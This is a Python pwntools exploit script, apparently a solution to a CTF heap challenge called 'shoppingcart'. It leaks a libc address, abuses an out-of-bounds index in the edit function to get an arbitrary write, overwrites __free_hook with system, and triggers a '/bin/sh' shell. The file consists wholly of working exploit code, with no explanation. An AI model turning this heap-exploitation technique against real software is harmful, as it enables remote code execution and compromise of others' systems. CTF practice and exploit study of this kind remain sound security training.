#!/usr/bin/python3
from pwn import *
fname = "./pwn2"
elf = ELF(fname, checksec=False)
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

if args.REMOTE:
    io = remote("ip", 0000)
    libc = ELF("./libc-2.27.so")
else:
    io = process([fname])
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    base = io.libs()['/pwd/HWB2018_shoppingcart/pwn2']
    cmd = \
    """
    b *0x{:x}
    """.format(base+0xce5)
ru = lambda x : io.recvuntil(x)
se = lambda x : io.send(x)
rl = lambda x: io.recvline()
sl = lambda x : io.sendline(x)
rv = lambda x : io.recv(x)
sea = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a, b)
lg = lambda name,x: success(name+": 0x%x"%x)
"""
    libc-2.27.so
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
"""

def add_money():
    sla("rich man!\n", "1")
    sla("RMB or Dollar?", "A"*8)

def add(size,name):
    ru("Now, buy buy buy!")
    sl('1')
    ru("name?")
    sl(str(size))
    ru("What is your goods name?")
    se(name)

def remove(idx):
    ru("Now, buy buy buy!")
    sl('2')
    ru("Which goods that you don't need?")
    sl(str(idx) )

def edit(idx):
    ru("Now, buy buy buy!")
    sl('3') 
    ru("Which goods you need to modify?")
    sl(str(idx))

def edit_vul(context):
    ru("Now, buy buy buy!")
    sl('3') 
    ru("Which goods you need to modify?")
    se(context)

for i in range(20):
    add_money()
    lg("add money", i)
sl("3")
add(0xf8, "wangtsiao")
add(0x68, '/bin/sh\x00')
remove(0)
add(0, "")
edit(2)
ru("modify ")
libc.address = u64(io.recv(6).ljust(8, b'\x00')) - (0x7fb1a62a5c68-0x7fb1a5ee1000)
attach(io, cmd)
lg("libc", libc.address)
sla("to?\n", "")

edit((0x202140+19*8-0x2021e0)/8)
sea("to?\n", "A"*8)

payload = (str((0x202140 - 0x2021E0 )/8)+'\n') 

payload+= (str(2)+'\n') 
payload+= (str(1)+'\n')
payload = payload.ljust(0x1000-0x20,'a')
payload = payload.encode() # str 2 bytes, python3 feature, ignore this.
payload+= p64(libc.symbols['__free_hook'])
edit_vul(payload)
sea("to?\n", p64(libc.symbols['system']))

io.interactive()
